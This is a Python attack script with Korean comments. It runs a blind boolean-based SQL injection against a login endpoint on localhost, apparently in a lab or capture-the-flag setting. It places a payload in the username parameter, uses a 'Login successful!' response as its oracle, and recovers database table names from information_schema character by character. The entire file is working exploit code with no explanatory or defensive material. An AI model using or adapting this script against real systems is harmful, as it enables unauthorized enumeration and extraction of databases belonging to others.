import requests

# 대상 URL
url = "http://127.0.0.1:25576/login"

# 테이블 이름 추출 함수
def get_table_name_by_length(length, offset):
    table_name = ""  # 테이블 이름 초기화
    for position in range(1, length + 1):  # 테이블 이름의 각 위치를 확인
        for char_code in range(32, 127):  # 출력 가능한 ASCII 문자 범위
            # GET 요청에 사용될 페이로드
            payload = (
                f"' OR (SELECT ASCII(SUBSTRING(table_name, {position}, 1)) FROM information_schema.tables "
                f"WHERE table_schema = DATABASE() LIMIT 1 OFFSET {offset}) = {char_code}-- "
            )
            params = {
                "username": payload,
                "password": "test"  # 임의의 비밀번호
            }
            
            # HTTP GET 요청
            response = requests.get(url, params=params)
            
            # 응답 확인
            if "Login successful!" in response.text:
                table_name += chr(char_code)  # 문자 추가
                print(f"OFFSET {offset} 테이블 이름 진행 중: {table_name}")
                break
    return table_name

# 모든 테이블 이름 추출 함수
def get_all_table_names(lengths):
    table_names = []
    for offset, length in enumerate(lengths):
        table_name = get_table_name_by_length(length, offset)
        table_names.append(table_name)
        print(f"OFFSET {offset} 테이블 이름: {table_name}")
    return table_names

# 테이블 이름의 길이 
table_lengths = [7,5]

# 실행
table_names = get_all_table_names(table_lengths)
print("모든 테이블 이름:", table_names)
